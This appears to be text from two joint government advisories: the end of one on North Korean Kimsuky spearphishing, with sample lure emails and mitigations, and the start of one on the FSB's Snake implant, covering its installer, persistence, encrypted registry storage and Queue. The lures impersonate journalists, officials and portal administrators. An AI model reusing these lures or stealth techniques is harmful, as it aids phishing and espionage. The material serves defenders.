s latest missile launches, including the launch of an intermediate-range ballistic
missile (IRBM) over Japan on October 4 and two short-range ballistic missiles (SRBMs) on
October 6, provide a stark reminder of the numerous missile programs it is pursuing.
Subject is as follows:
1) Would Pyongyang conduct its next nuclear test soon after China
s Communist Party
Congress in mid-October?
2) May a quieter approach to North Korean aggression be warranted?
3) Would Japan increase the defense budget and a more proactive defense policy?
You can send me this email by Oct 21. You can make your own title for your article. We can
provide you with a small honorarium of around USD 480.00.
I would really appreciate it if you can contribute.
Best,
<Redacted>
Senior Fellow, <think tank>
Director, <think tank>
Follow-on email: The Kimsuky actor then sent a second communication with malicious content.
Dear <think tank employee>,
Sorry for my late response.
As promised, I
m writing to send our result of the review. Please find the attached and let me
know if any problems.
PW: <redacted>
Best,
<Redacted>
Senior Fellow, <think tank>
Director, <think tank>
Page 12 of 21 | Product ID: CSA-20230601-1
TLP:CLEAR
TLP:CLEAR
FBI | DOS | NSA| NIS | NPA | MOFA
4. Impersonation of government officials, law enforcement, web administrators
Below is an example of how Kimsuky actors approach their targets by impersonating individuals
responsible for North Korean policies in government agencies, such as the South Korean National
Assembly or the presidential office. These impersonated individuals may have already had their
accounts compromised through a previous attack. Kimsuky actors may mention specific information
about the target
s position or schedule, which they obtained from the target
s email exchanges or
address book.
Sample email communication 7:
Title: Office of <member of the National Assembly>/Seminar 
Proposal for the Unification
Policies of the Yoon Government
Hello, this is <name of secretary> from the office of <member of the National Assembly>.
Let me express our gratitude for your attendance and participation at the seminar we hosted
yesterday. Your presence and insights contributed greatly to the success of the event.
If it
s not too much trouble, could you kindly provide us with a brief summary of the remarks
you made during the seminar? We would like to keep it as an internal reference material.
Additionally, we would greatly appreciate it if you could fill out the attached form and send it
back to us. This will serve as an evidence document for the speaking fee payment
procedure.
Password: <redacted>
Thank you again for your participation and we hope to see you at future events. Have a
great weekend.
Kimsuky actors may also impersonate investigative agencies or law enforcement officials to deceive a
target into believing that their email account has been involved in an illegal incident. They use the
authority of investigative agencies to approach the target, implying that their account may have been
stolen and that they could be involved in a criminal or national security-related incident.
Page 13 of 21 | Product ID: CSA-20230601-1
TLP:CLEAR
TLP:CLEAR
FBI | DOS | NSA| NIS | NPA | MOFA
Sample email communication 8:
Title: <legitimate Investigator> of <legitimate investigation agency>.
I am <legitimate Investigator> of <legitimate investigation agency>.
m writing to inform you that someone has published content on YouTube using your email
account that violates the National Security Law.
Link: https:// HYPERLINK "https://%3cyoutube/"< HYPERLINK
"https://%3cyoutube/"YouTube video link>. The video was posted on <Date: 0000. 0. 00.>
by <target>
We also suspect that the same user has posted content that slanders North Korean
defectors. We need your cooperation to identify the real publisher of these posts.
1. Provide us with your computer media access control address (MAC address) and
Ethernet hardware address, as they are needed to track any illegal access to your email
account.
2. If you cannot locate these addresses in your computer system, please run the program
below and send us the resulting document: <check tool.zip>
3) Please respond to this email within 24 hours and delete it immediately after sending your
reply.
Thanks you for your cooperation
Additionally, Kimsuky actors impersonate operators or administrators of popular web portals and
claim that a victim
s account has been locked following suspicious activity or fraudulent use. Victims
are advised to protect their personal information and unlock their account by clicking a link attached to
the email and changing their password. The link leads to a phishing site that mimics a legitimate web
portal login page where victims are directed to input personal information, including their usernames
and passwords, for harvesting by DPRK cyber actors.
Page 14 of 21 | Product ID: CSA-20230601-1
TLP:CLEAR
FBI | DOS | NSA| NIS | NPA | MOFA
TLP:CLEAR
Sample email communication 9:
Title: Your Password for <legitimate portal site> Account Has Been Compromised
We regret to inform you that we have detected an attempt to log into your account (<email
address>) from an unauthorized application. The incident occurred on <date> at <time>
(Korea Standard Time), and the IP address used was <IP address> located in Washington,
the U.S.
In order to prevent any further unauthorized access to your account, we recommend that
you change your password immediately. You can do this by clicking on the following link:
<link to change password - legitimate>
Please note that if you fail to change your password, we may have to permanently delete or
close your account in accordance with our security policy.
POTENTIAL MITIGATION MEASURES
For email recipients:
Implement basic cyber hygiene to include robust passwords, multifactor authentication, and
installation of antivirus tools. See NSA
s Best Practices for Securing Your Home Network or
s guidance for email security for more details.
Do not enable macros on documents received via email, unless the source is verified.
Do not open documents from cloud hosting services when shared via email, unless the source
is verified.
Closely scrutinize identities and associated social media or credentials for fraud. Be especially
cautious of:
Official messages coming from unofficial or personal email accounts using commercial
providers.
Domain/subdomain variations, as DPRK cyber actors have been known to register
spoofed domains (e.g., johndoe@abccompany.live vs. johndoe@abccompany.com).
If you were previously in communication with the individual, use the known legitimate contact
information instead of the new, potentially malicious email or account.
When in doubt, consult the organization
s official website for correct contact information.
Page 15 of 21 | Product ID: CSA-20230601-1
TLP:CLEAR
FBI | DOS | NSA| NIS | NPA | MOFA
TLP:CLEAR
If you are still not sure, verify identities via phone or video call before engaging further. DPRK
cyber actors are not known to engage outside of the virtual environment and will avoid
voice/video communications.
If you cannot verify the source of an email inquiry, consider the risks before responding.
Consider navigating to websites using a search engine
s non-sponsored results instead of
clicking on URLs provided in the email(s).
Be cautious of a request to move communications to a separate messaging platform.
If sending documents, only send to verified email addresses.
For potential recipients
 systems administrators:
Implement a user training program and phishing exercises to raise awareness among users
about the risks of visiting websites, clicking on links, and opening attachments. Reinforce the
appropriate user response to phishing and spearphishing emails.
Require phishing-resistant multi-factor authentication (MFA) for as many services as
possible
particularly for webmail, virtual private networks (VPNs), accounts that access
critical systems, and privileged accounts that manage backups.
Regularly use port checking capabilities to determine if your network is being accessed
remotely via desktop sharing software or a VPN or VPS, particularly if usage of remote
desktop sharing software or VPN services to access accounts is not standard practice.
If you allow the use of Remote Desktop Protocol (RDP), or other potentially risky remote
services, secure and monitor them closely.
Limit access to resources over internal networks, especially by restricting RDP and
using virtual desktop infrastructure. After assessing risks, if RDP is deemed
operationally necessary, restrict the originating sources and require phishing-resistant
MFA to mitigate credential theft and reuse. If RDP must be available externally, use a
VPN, virtual desktop infrastructure, or other means to authenticate and secure the
connection before allowing RDP to connect to internal devices. Monitor remote
access/RDP logs, enforce account lockouts after a specified number of attempts to
block brute force campaigns, log RDP login attempts, and disable unused remote
access/RDP ports.
Ensure devices are properly configured and that security features are enabled. Disable
ports and protocols not in use for a business purpose (e.g., RDP Transmission Control
Protocol port 3389).
Page 16 of 21 | Product ID: CSA-20230601-1
TLP:CLEAR
FBI | DOS | NSA| NIS | NPA | MOFA
TLP:CLEAR
Restrict the Server Message Block (SMB) protocol within the network to only access
necessary servers and remove or disable outdated versions of SMB (i.e., SMB version
1). Threat actors use SMB to propagate malware across organizations.
Review the security posture of third-party vendors and those interconnected with your
organization. Ensure all connections between third-party vendors and outside software
or hardware are monitored and reviewed for suspicious activity.
Implement application control policies that only allow systems to execute known and
permitted programs.
Open document readers in protected viewing modes to help prevent active content from
running.
Install updates for operating systems, software, and firmware as soon as they are released.
Timely patching is one of the most efficient and cost-effective steps an organization can take
to minimize its exposure to cybersecurity threats. Regularly check for software updates and
end-of-life notifications and prioritize patching known exploited vulnerabilities. Consider
leveraging a centralized patch management system to automate and expedite the process.
Install and regularly update antivirus and antimalware software on all hosts.
Consider requiring administrator credentials to install software.
Add an email banner to messages coming from outside your organizations indicating that they
are higher risk messages.
Consider adding rules to block emails that match the sample emails provided in this advisory.
Ensuring that you know how to scan for malicious undelivered email messages on email
servers is a critical step for preparing to understand the scope of this type of targeting once
malicious email identifiers are discovered.
Enabling DMARC and DKIM on email domains generally makes certain forms of email
spoofing more difficult, though it may not directly mitigate the tactics described above.
Page 17 of 21 | Product ID: CSA-20230601-1
TLP:CLEAR
TLP:CLEAR
FBI | DOS | NSA| NIS | NPA | MOFA
DPRK Rewards for Justice
The U.S. and ROK Governments encourage victims to report suspicious activities, including those
related to suspected DPRK cyber activities, to relevant authorities. If you provide information about
illicit DPRK activities in cyberspace, including past or ongoing operations, you may be eligible for a
reward. If you have information about illicit DPRK activities in cyberspace, including past or ongoing
operations, providing such information through the Department of State
s Rewards for Justice
program could make you eligible to receive an award of up to $5 million. For further details, please
visit https://rewardsforjustice.net/.
Disclaimer
The information in this report is being provided 
as is
 for informational purposes only. The authoring
agencies do not endorse any commercial product or service, including any subjects of analysis. Any
reference to specific commercial products, processes, or service by service mark, trademark,
manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring
by the co-authors.
Page 18 of 21 | Product ID: CSA-20230601-1
TLP:CLEAR
TLP:CLEAR
FBI | DOS | NSA| NIS | NPA | MOFA
APPENDIX: ADDITIONAL SPEARPHISHING SAMPLES
Sample email communication 10:
This is <name of legitimate journalist> from <legitimate non-U.S. news
organization>
m writing to know your thoughts on North Korea
s future direction after the Beijing
Winter Olympics are over. Many believe a recent absence of North Korean
provocations is due to Pyongyang
s decision not to hurt Olympic vibes held in its lone
major ally, but with the Games in the books, speculation is growing that North Korea
is likely to pick up where it left off in January, or a series of missile tests.
-Do you believe North Korea will resume testing its missile launches? If so, when is
the best time for it and what kind of missiles it will opt?
-China is scheduled to hold the National People
s Congress, and the Chinese
People
s Political Consultative Conference from March 4 to 13 and do you think the
schedule will further defer North Korea
s possible missile testing?
-North Korea has indicated that it will lift its moratorium on missile and nuclear tests,
but do you think there is the possibility that Pyongyang will offer to talk with the U.S.,
putting the moratorium on the line? If so, what would be the U.S. response? I
d be
very grateful if you could send me your answers within this week
Sample email communication 11:
Title: Documents for the Policy Advisory Committee.
Hello, <member of the committee>,
I am <name of government employee> from <government department>.
I am writing to inform you that I have attached the filed related to the recent visit of Special
Representative Biegun to this email.
As this email contains sensitive information, please treat it as confidential.
<file name.pdf>
Page 19 of 21 | Product ID: CSA-20230601-1
TLP:CLEAR
TLP:CLEAR
FBI | DOS | NSA| NIS | NPA | MOFA
Sample email communication 12:
Dear <university professor>:
I hope you are safe and well.
This is <legitimate journalist> from <legitimate non-U.S. news organization>. I am
sending e-mail to you because I would like to hear your opinions about how Russia
invasion of Ukraine will affect the situation surrounding North Korea. Would you like to give
me your opinions about the questions below?
1) Some analysts argue that Russia
s invasion of Ukraine may make North Korea much
more reluctant to give up nuclear weapons, given that Ukraine has been eventually invaded
by Russia after it abandoned its nuclear arsenal in exchange for security guarantees under
the Budapest Memorandum. This certainly looks similar to an agreement made between
Trump and Kim Jong Un in Singapore in 2018. What do you think about this kind of
argument?
2) While the Biden administration is concentrated on the evolving circumstances surrounding
Ukraine, possibly lowering its guard in the Asia-Pacific region, North Korea Launches New
ICBM and may try to carry out nuclear tests. What do you think about North Korea
s future
developments?
3) Do you think North Korea believes that Biden is already a 
lame duck
 and sees this as a
good chance to concentrate on developing new weapons?
4) Do you expect China will tolerate North Korea
s spate of ballistic missile launches and
possible nuclear tests? Do you think North Korea can or will maintain stable and amicable
relations with China? Does Russia not afford to care about North Korea?
I would be very grateful if you could send me your answers within 5 days. Thanks for your
consideration and time in advance.
best regards.
<legitimate journalist>
Page 20 of 21 | Product ID: CSA-20230601-1
TLP:CLEAR
TLP:CLEAR
FBI | DOS | NSA| NIS | NPA | MOFA
Sample email communication 13:
Title: Your email account has been suspended
We are writing to inform you that your email account has been suspended because emails
you sent appear to have violated relevant laws and in some cases you may be held legally
liable. If you did not send any spam mails from your <portal site> mail account, it is possible
that your account may have been compromised and used by someone else for spamming.
We recommend checking your email settings to ensure that your POP/IMAP options have
not 
Enabled
 others to use your account.
If you are still unable to identify any problems with your email settings, it is possible that your
account has been hacked and your personal information was stolen. To regain access to
your email account, please follow the steps provided by our investigation department by
clicking the button below.
<Button linking to phishing website disguised as a normal portal login page>
Sample email communication 14:
Title: Notification regarding your fraudulent account registration
This is the <legitimate portal site> operation team, and we regret to inform you that your ID
<redacted> has been registered as a fraudulent account. To prevent any further harm, we
recommend that you take immediate action.
We kindly request you to verify your identity as soon as possible to ensure the safety and
security of your account. You can do this by visiting the member information page and
checking the registered name. We also advise you to change your password to keep your
account protected. Please be aware that the fraudulent account registration occurred on
00:00, 00/00/0000.
To unlock your account, please follow the link provided below:
<unlock your account: malicious link>
Thank you for choosing <legitimate portal site> as your trusted platform. We are committed
to providing you with the best possible service and support.
Page 21 of 21 | Product ID: CSA-20230601-1
TLP:CLEAR
Co-Authored by:
TLP:CLEAR
Product ID: AA23-129A
May 9, 2023
Hunting Russian Intelligence 
Snake
 Malware
SUMMARY
The Snake implant is considered the most sophisticated cyber espionage tool designed and used by
Center 16 of Russia
s Federal Security Service (FSB) for long-term intelligence collection on sensitive
targets. To conduct operations using this tool, the FSB created a covert peer-to-peer (P2P) network of
numerous Snake-infected computers worldwide. Many systems in this P2P network serve as relay
nodes which route disguised operational traffic to and from Snake implants on the FSB
s ultimate
targets. Snake
s custom communications protocols employ encryption and fragmentation for
confidentiality and are designed to hamper detection and collection efforts.
We have identified Snake infrastructure in over 50 countries across North America, South America,
Europe, Africa, Asia, and Australia, to include the United States and Russia itself. Although Snake
uses infrastructure across all industries, its targeting is purposeful and tactical in nature. Globally, the
FSB has used Snake to collect sensitive intelligence from high-priority targets, such as government
networks, research facilities, and journalists. As one example, FSB actors used Snake to access and
exfiltrate sensitive international relations documents, as well as other diplomatic communications,
from a victim in a North Atlantic Treaty Organization (NATO) country. Within the United States, the
FSB has victimized industries including education, small businesses, and media organizations, as
well as critical infrastructure sectors including government facilities, financial services, critical
manufacturing, and communications.
This Cybersecurity Advisory (CSA) provides background on Snake
s attribution to the FSB and
detailed technical descriptions of the implant
s host architecture and network communications. This
CSA also addresses a recent Snake variant that has not yet been widely disclosed. The technical
information and mitigation recommendations in this CSA are provided to assist network defenders in
detecting Snake and associated activity. For more information on FSB and Russian state-sponsored
cyber activity, please see the joint advisory Russian State-Sponsored and Criminal Cyber Threats to
Critical Infrastructure and CISA
s Russia Cyber Threat Overview and Advisories webpage.
To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact
your local FBI field office or CISA
s 24/7 Operations Center at Report@cisa.gov or (888) 282-0870. When
available, please include the following information regarding the incident: date, time, and location of the incident;
type of activity; number of people affected; type of equipment used for the activity; the name of the submitting
company or organization; and a designated point of contact.
This document is marked TLP:CLEAR. Recipients may share this information without restriction. Information is
subject to standard copyright rules. For more information on the Traffic Light Protocol, see cisa.gov/tlp/.
TLP:CLEAR
TLP:CLEAR
International Partnership
TABLE OF CONTENTS
Summary ......................................................................................................................................... 1
Introduction..................................................................................................................................... 4
What is Snake? ............................................................................................................................ 4
Background ................................................................................................................................... 4
Attribution ..................................................................................................................................... 5
Victimization ................................................................................................................................. 5
Other Tools and TTPs Employed with Snake ........................................................................... 6
Snake Architecture ...................................................................................................................... 6
Capitalizing on Mistakes ............................................................................................................. 7
Snake Host-Based Technical Details ....................................................................................... 8
Installer .......................................................................................................................................... 8
On-Disk Components ................................................................................................................... 8
The Queue ................................................................................................................................... 11
Snake Network Communications ........................................................................................... 17
Network Obfuscation ................................................................................................................. 17
Snake
s Network Authentication Technique (
ustart
) ........................................................ 17
Snake UDP .................................................................................................................................. 19
Snake HTTP ................................................................................................................................. 20
Snake TCP ................................................................................................................................... 21
Snake 
 Layer ...................................................................................................................... 23
Snake Application Layer ........................................................................................................... 24
Command 0x15-byte Header ................................................................................................... 24
Command Encryption ................................................................................................................ 24
Command Decoding .................................................................................................................. 25
High Commands ......................................................................................................................... 26
Queue Commands ..................................................................................................................... 27
Forward Commands .................................................................................................................. 28
Page 2 of 48 | Product ID: AA23-129A
TLP:CLEAR
TLP:CLEAR
International Partnership
Snake Implant Operation.......................................................................................................... 31
Active Operations ....................................................................................................................... 31
Passive Operations .................................................................................................................... 31
Mitigations .................................................................................................................................... 35
Network-Based Detection ......................................................................................................... 35
Host-Based Detection ................................................................................................................ 37
Memory Analysis ........................................................................................................................ 40
Prevention ..................................................................................................................................... 42
Change Credentials and Apply Updates ................................................................................. 42
Execute Organizational Incident Response Plan .................................................................. 42
Appendix ........................................................................................................................................ 43
Partnership.................................................................................................................................. 43
Disclaimer ................................................................................................................................... 43
MITRE ATT&CK
 Techniques ................................................................................................... 43
Volatility Plugin ........................................................................................................................... 47
Page 3 of 48 | Product ID: AA23-129A
TLP:CLEAR
TLP:CLEAR
International Partnership
INTRODUCTION
What is Snake?
We consider Snake to be the most sophisticated cyber espionage tool in the FSB
s arsenal. The
sophistication of Snake stems from three principal areas. First, Snake employs means to achieve a
rare level of stealth in its host components and network communications. Second, Snake
s internal
technical architecture allows for easy incorporation of new or replacement components. This design
also facilitates the development and interoperability of Snake instances running on different host
operating systems. We have observed interoperable Snake implants for Windows, MacOS, and Linux
operating systems. Lastly, Snake demonstrates careful software engineering design and
implementation, with the implant containing surprisingly few bugs given its complexity.
Following open source reporting by cybersecurity and threat intelligence companies on Snake tactics,
techniques, and procedures (TTPs), the FSB implemented new techniques to evade detection. The
modifications to the implant enhanced challenges in identifying and collecting Snake and related
artifacts, directly hampering detection from both host- and network-based defensive tools.
The effectiveness of this type of cyber espionage implant depends entirely on its long-term stealth,
since the objective of an extended espionage operation involves remaining on the target for months
or years to provide consistent access to important intelligence. The uniquely sophisticated aspects of
Snake represent significant effort by the FSB over many years to enable this type of covert access.
Background
The FSB began developing Snake as 
Uroburos
 in late 2003. Development of the initial versions of
the implant appeared to be completed around early 2004, with cyber operations first conducted using
the implant shortly thereafter. The name Uroburos is appropriate, as the FSB cycled it through nearly
constant stages of upgrade and redevelopment, even after public disclosures, instead of abandoning
it. The name appears throughout early versions of the code, and the FSB developers also left other
unique strings, including 
Ur0bUr()sGoTyOu#
, which have publicly come back to haunt them.
Unique features in early versions of Uroburos included a low
resolution image of a portion of a historical illustration of an
uroboros by the German philosopher and theologian Jakob
hme. One approach to a tertiary backdoor used this image
as the key. The same image had also been embedded in other
Snake-related components. The image, blown up to a higher
resolution, is shown at right.
In addition, early FSB developers of the Snake implant left
portions of unique code throughout the implant which reveal
inside jokes, personal interests, and taunts directed at security
researchers. For instance, the 
Ur0bUr()sGoTyOu#
 string
referenced above was replaced with 
gLASs D1cK
 in 2014
following some of the public cybersecurity reporting.
Page 4 of 48 | Product ID: AA23-129A
TLP:CLEAR
TLP:CLEAR
International Partnership
Attribution
We attribute Snake operations to a known unit within Center 16 of the FSB.1 This unit more broadly
operates the numerous elements of the Turla2 toolset, and has subunits spread throughout Russia in
a reflection of historical KGB signals intelligence operations in the Soviet Union. Snake has been a
core component of this unit
s operations for almost as long as Center 16 has been part of the FSB.3
The extensive influence of Snake across the Turla toolset demonstrates its impact on practically
every aspect of the unit
s modern era of cyber operations.
Daily operations using Snake have been carried out from an FSB facility in Ryazan, Russia, with an
increase in Snake activity during FSB working hours in Ryazan, approximately 7:00 AM to 8:00 PM,
Moscow Standard Time (GMT+3). The main developers were Ryazan-based FSB officers known by
monikers included in the code of some versions of Snake. In addition to developing Snake, Ryazanbased FSB officers used it to conduct worldwide operations; these operations were different from
others launched from Moscow or other FSB sites based on infrastructure and techniques.
While the development and re-tooling of Snake has historically been done by Ryazan-based FSB
officers, Snake operations were also launched from an FSB Center 16-occupied building in Moscow.
Our investigations have identified examples of FSB operators using Snake to its full potential, as well
as FSB operators who appeared to be unfamiliar with Snake
s more advanced capabilities. These
observations serve to illustrate the difficulty in using such an advanced toolset across the various
geographically dispersed teams comprising this unit within FSB Center 16.
We have been collectively investigating Snake and Snake-related tools for almost 20 years, as well
as other operations by this unit since the 1990s. During that time, the FSB has used Snake in many
different operations, and they have demonstrated the value placed in this tool by making numerous
adjustments and revisions to keep it viable after repeated public disclosures and other mitigations.
Snake
s code and multiple Snake-related tools have been either a starting point or a key influence
factor for a diverse range of other highly prolific implants and operational tools in the Turla family.
Most notably, this has included Carbon (aka Cobra)
derived from Snake
s code base
and the
similarly Snake-adjacent implant Chinch (currently known in open sources as ComRAT).
Victimization
We have identified Snake infrastructure in over 50 countries across North America, South America,
Europe, Africa, Asia, and Australia, to include the United States and Russia itself. Although Snake
leverages infrastructure across all industries, its targeting is purposeful and tactical in nature. For
instance, if an infected system did not respond to Snake communications, the FSB actors would
strategically re-infect it within days. Globally, the FSB has used Snake to collect sensitive intelligence
from high priority targets, such as government networks, research facilities, and journalists. As one
example, FSB actors used Snake to access and exfiltrate sensitive international relations documents,
This unit is distinct from a sister unit in FSB Center 16 which the FBI publicly attributes to Dragonfly operations.
Turla is one of many open source terms used to describe the family of implants used by this FSB Center 16 unit. Snake
and the broader Turla family have also previously been referenced in private sector reporting using the names Krypton,
Venomous Bear, Penquin, Agent.BTZ, ComRAT, Waterbug, Tavdig, Wipbot, Epic Turla, Mosquito, Carbon, and others.
The 3rd Chief Directorate of FAPSI was transferred to the FSB as Center 16 when FAPSI was dissolved in 2003.
Page 5 of 48 | Product ID: AA23-129A
TLP:CLEAR
TLP:CLEAR
International Partnership
as well as other diplomatic communications, from a victim in a NATO country. Within the United
States, the FSB has victimized industries including education, small businesses, and media
organizations, as well as critical infrastructure sectors including government facilities, financial
services, critical manufacturing, and communications.
Other Tools and TTPs Employed with Snake
The FSB typically deploys Snake to external-facing infrastructure nodes on a network, and from there
uses other tools and TTPs on the internal network to conduct additional exploitation operations. Upon
gaining and cementing ingress into a target network, the FSB typically enumerates the network and
works to obtain administrator credentials and access domain controllers. A wide array of mechanisms
has been employed to gather user and administrator credentials in order to expand laterally across
the network, to include keyloggers, network sniffers, and open source tools.4
Typically, after FSB operators map out a network and obtain administrator credentials for various
domains in the network, regular collection operations begin. In most instances with Snake, further
heavyweight implants are not deployed, and they rely on credentials and lightweight remote-access
tools internally within a network. FSB operators sometimes deploy a small remote reverse shell along
with Snake to enable interactive operations. This triggerable reverse shell, which the FSB has used
for around 20 years, can be used as a backup access vector, or to maintain a minimal presence in a
network and avoid detection while moving laterally.5
Snake Architecture
Snake
s architectural design reflects professional software engineering practices. Critical pathways
within the implant are made of stacks of loosely coupled components that implement well-designed
interfaces. In addition to facilitating software development and debugging, this construction allows
Snake to use multiple different components for the same purpose, choosing the specific component
based on environmental considerations. For example, Snake
s custom network communications
protocols function as a stack. All implementations use an encryption layer and a transport layer, such
as Snake
s custom HTTP or raw TCP socket protocol. Each layer of the Snake network protocol stack
solely implements a specified interface for operability with the two adjacent layers. The encryption
layer and underlying transport layer thus function independently, so any custom Snake network
protocol can employ an encryption overlay without any change to the encryption layer code.6
This modularity allows Snake operators to choose the most logical network transport for the given
environment without affecting Snake
s other functionality. When using a compromised HTTP server
as part of the Snake P2P network, the operators can ensure that all traffic to this machine follows the
Snake custom HTTP protocol and thereby blends effectively with legitimate traffic. In the context of a
compromised machine that legitimately allows secure shell (SSH) connections, Snake can utilize its
custom raw TCP socket protocol instead of its custom HTTP protocol. All other layers of the Snake
protocol stack, from the immediately adjacent transport encryption layer to the distant command
processing layer, can and do remain entirely agnostic to the transport layer as long as it implements
MITRE ATT&CK IDs: [T0840], [T1003], [T1040], [T1046], [T1056.001], [T1078], [T1083], [T1135], [T1482]
MITRE ATT&CK IDs: [T1190], [T1570], [T1587.001], [T1608]
MITRE ATT&CK IDs: [T1095], [T1547.006], [T1587.001]
Page 6 of 48 | Product ID: AA23-129A
TLP:CLEAR
TLP:CLEAR
International Partnership
its interface correctly. This architecture also allows the Snake developers to easily substitute a new
communications protocol when they believe one has been compromised, without necessitating any
downstream changes in the code base. Lastly, this design facilitates the development of fully
interoperable Snake implants running on different host operating systems.
Snake
s technical sophistication extends from the software architecture into the lower-level software
implementation. Original versions of Snake were developed as early as 2003, before many of the
modern programming languages and frameworks that facilitate this type of modular development
were available. Snake is written entirely in C, which provides significant advantages in low-level
control and efficiency, but which does not provide direct support for objects or interfaces at the
language level and provides no assistance with memory management. The developers of Snake
successfully implemented the implant
s complex design in C with very few bugs, including careful
avoidance of the common pitfalls associated with null-terminated strings and the mixing of signed and
unsigned integers. Additionally, the developers demonstrate an understanding of computer science
principles throughout the implant
s implementation. This includes selecting and correctly coding
asymptotically optimal algorithms, designing and utilizing efficient custom encoding methodologies
that closely resemble common encoding schemes, and handling the numerous possible errors
associated with systems-level programming in a secure manner.
Capitalizing on Mistakes
Although the Snake implant as a whole is a highly sophisticated espionage tool, it does not escape
human error. A tool like Snake requires more familiarity and expertise to use correctly, and in several
instances Snake operators neglected to use it as designed. Various mistakes in its development and
operation provided us with a foothold into the inner workings of Snake and were key factors in the
development of capabilities that have allowed for tracking Snake and the manipulation of its data.
The FSB used the OpenSSL library to handle its Diffie-Hellman key exchange. The Diffie-Hellman
key-set created by Snake during the key exchange is too short to be secure. The FSB provided the
function DH_generate_parameters with a prime length of only 128 bits, which is inadequate for
asymmetric key systems. Also, in some instances of what appeared to be rushed deployments of
Snake, the operators neglected to strip the Snake binary. This led to the discovery of numerous
function names, cleartext strings, and developer comments as seen in the following figure.
Page 7 of 48 | Product ID: AA23-129A
TLP:CLEAR
TLP:CLEAR
International Partnership
SNAKE HOST-BASED TECHNICAL DETAILS
The FSB has quickly adapted Snake when its capabilities have been publicly disclosed by private
industry. Snake therefore exists in several variants, as it has evolved over almost 20 years. This CSA
focuses on one of the more recent variants of Snake that up until now has not been widely disclosed.
Older variants of Snake will be discussed briefly where applicable, but not discussed in depth, as
many details of earlier Snake variants already exist in the public domain.
Installer
The Snake installer has gone by various names throughout Snake
s existence (e.g., 
jpinst.exe
). This
advisory will describe the version of the installer which regularly used the name 
jpsetup.exe
. This
executable is packed using a customized obfuscation methodology. The developers appear to have
added the unpacking functionality from an open source project for viewing JPEG files. This technique
serves to obfuscate the unpacking code within an otherwise legitimate code base.7 The unpacking
code extracts an executable, herein referred to as the 
Png Exe
, and it extracts an AES encrypted
blob from the Png Exe
s resources, which herein will be referred to as the 
Png Resource
The jpsetup.exe installer requires two arguments to be passed via the command line for execution.
The first argument is a wide character string hashed with SHA-256 twice, and the resulting value of
these computations becomes the AES key that decrypts the Png Resource. The AES initialization
vector (IV) consists of the first 16 bytes of the second argument to jpsetup.exe after prepending the
argument with a wide character 
 string. Once decrypted, the Png Resource becomes an
executable that will be referred to herein as 
Stage 2
When unpacked, many components are extracted from Stage 2
s resources. Several of the resources
are executables with additional resources of their own. Stage 2 creates structures from its resources,
which ultimately become the host artifacts of Snake.
On-Disk Components
As Windows has been the most prevalent operating system targeted by Snake, this document will
only discuss the Windows-based artifacts; however, Snake can be cross-compiled and is capable of
running on other operating systems.
On-Disk Obfuscation
Snake
s host architecture and network communications allow an unusual level of stealth. Snake
makes inventive use of its kernel module in both of these contexts. All known Windows versions of
Snake have used a concealed storage mechanism to hide host componentry. In addition to using the
kernel module to remove the relevant components from any listing returned by the operating system,
Snake utilizes the kernel module to mediate any requests between Snake
s user mode components
and the concealed storage mechanism, which itself is encrypted with a unique per-implant key. This
The Snake developers have long used custom packers for the implant. This packer had several options for disguising the
installer on a host. The first was as a JPEG viewer; later options included disguising the installer as Notepad++ or 7zip.
MITRE ATT&CK IDs: [T1027.002], [T1140], [T1546.016], [T1588], [T1610]
MITRE ATT&CK IDs: [T1573.001], [T1573.002]
Page 8 of 48 | Product ID: AA23-129A
TLP:CLEAR
TLP:CLEAR
International Partnership
unique keying creates detection difficulties even for tools that are independent of the compromised
operating system, since simple signatures targeting Snake host components would be ineffective.10
Persistence Mechanism
The Snake version primarily discussed in this advisory registers a service to maintain persistence on
a system. Typically, this service is named 
WerFaultSvc,
 which we assess was used to blend in with
the legitimate Windows service WerSvc. On boot, this service will execute Snake
s WerFault.exe,
which Snake developers chose to hide among the numerous valid Windows 
WerFault.exe
 files in
the %windows%\WinSxS\ directory. Executing WerFault.exe will start the process of decrypting
Snake
s components and loading them into memory.11
MITRE ATT&CK IDs: [T1014], [T1027], [T1547.006], [T1610]
MITRE ATT&CK IDs: [T1027], [T1036], [T1140], [T1564], [T1569.002]
Page 9 of 48 | Product ID: AA23-129A
TLP:CLEAR
TLP:CLEAR
International Partnership
Encrypted Registry Key Data
Upon execution, Snake
s WerFault.exe will attempt to decrypt an encrypted blob within the Windows
registry that is typically found at HKLM:\SOFTWARE\Classes\.wav\OpenWithProgIds. The encrypted
data includes the AES key, IV, and path that is used to find and decrypt the file containing Snake
kernel driver and kernel driver loader. The registry object
s structure can be seen on the right side of
the following figure. Snake uses Microsoft Windows Cryptography API: Next Generation (CNG) key
store to store the AES key needed to decrypt the registry object.12
Kernel Driver and Custom Loader
Snake
s installer drops the kernel driver and a custom DLL which is used to load the driver into a
single AES encrypted file on disk. Typically, this file is named 
comadmin.dat
 and is stored in the
%windows%\system32\Com directory. The structure of this file can be seen on the left side of the
figure above. The key, IV, and path to comadmin.dat are stored in the encrypted registry blob.13
MITRE ATT&CK IDs: [T1106], [T1112], [T1547.006]
MITRE ATT&CK IDs: [T1027], [T1547.006], [T1569.002], [T1574.002]
Page 10 of 48 | Product ID: AA23-129A
TLP:CLEAR
TLP:CLEAR
International Partnership
The Queue File
The last host-based artifact to discuss is the Queue File. Typically, this file has been found within the
%windows%\Registration directory with the format of <RANDOM_GUID>.<RANDOM_GUID>.crmlog,
and is decrypted by Snake
s kernel driver. Due to the complexity and importance of the Queue File,
its details are discussed at length in the following subsection.14
The Queue
The Queue is a Snake structure that contains various pieces of information, including key material,
communication channels, modes of operation, the principal user mode component, etc., that Snake
requires for successful operation. It should be noted that this is a name used by the developers and is
not equivalent to a 
queue
 in the normal context of computer science. The Queue data is saved on
disk in the Queue File, which is a flat file with a substructure that includes a 0x2c-byte file header
followed by data blocks. Each data block corresponds to exactly one Queue Item, which could be, for
example, a simple configuration parameter, a Snake command, or an entire embedded executable.
Each Queue Item is associated with a specific Queue Container.
Queue Containers and Items
Each Container is identified by its Type and Instance values. Each Container Type holds the same
type of information used by the Snake implant for a specific purpose. The following table shows the
various Container Types and their functions. A Queue can have multiple Containers of the same
Type, but each of these Containers will have different Instance values.
MITRE ATT&CK IDs: [T1027], [T1112], [T1564], [T1610]
Page 11 of 48 | Product ID: AA23-129A
TLP:CLEAR
TLP:CLEAR
International Partnership
The data in each Container in the Queue is separated into Queue Items with the 0x40-byte metadata
structure shown in the following table. The data content of the Queue Item immediately follows this
